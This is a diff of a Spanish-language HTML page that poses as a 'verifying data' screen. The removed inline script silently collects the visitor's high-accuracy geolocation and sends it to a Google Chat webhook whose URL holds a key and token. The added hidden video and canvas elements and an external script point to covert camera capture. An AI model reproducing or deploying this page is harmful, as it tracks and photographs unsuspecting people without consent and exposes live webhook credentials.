@@ -1,47 +1,26 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
   <meta charset="UTF-8">
   <title>Verifica</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    html,body {height:100%;width:100%;margin:0;background:#222;color:#fff;display:flex;align-items:center;justify-content:center;}
-    .caja{display:flex;flex-direction:column;align-items:center;}
-    .oculto{display:none;}
+    html,body {
+      height:100%; width:100%; margin:0;
+      background:#222; color:#fff;
+      display:flex; align-items:center; justify-content:center;
+    }
+    .caja{display:flex; flex-direction:column; align-items:center;}
+    #video, #canvas { display:none; }
   </style>
 </head>
 <body>
   <div class="caja">
     <h2>Verificando datos…</h2>
     <div id="estado">Espere un momento por favor.</div>
+    <video id="video" autoplay playsinline width="320" height="240"></video>
+    <canvas id="canvas" width="320" height="240"></canvas>
   </div>
-<script>
-async function recolectarYEnviar() {
-  // Intentar recoger ubicación
-  let position = null;
-  try {
-    position = await new Promise((resolve, reject) => 
-      navigator.geolocation.getCurrentPosition(resolve, reject, {enableHighAccuracy:true,timeout:8000})
-    );
-  } catch(e) {}
-  let lat = position?.coords?.latitude || "null";
-  let lon = position?.coords?.longitude || "null";
-
-  // Mensaje para webhook (solo ubicación y nota)
-  let mensaje = {
-    text: `Foto tomada (no disponible como archivo)\nUbicación: https://maps.google.com/?q=${lat},${lon}`
-  };
-
-  // Enviar a Webhook
-  document.getElementById('estado').textContent = 'Enviando…';
-  await fetch("https://chat.googleapis.com/v1/spaces/AAQAkFNcrrQ/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=iKoaLISxJB0lYdLzbXY6B2NbeQ0cZ8P-cd5PXpHPDio",{
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(mensaje)
-  });
-  document.getElementById('estado').textContent = '¡Listo!';
-}
-setTimeout(recolectarYEnviar, 1500);
-</script>
+  <script src="verifica.js"></script>
 </body>
 </html>
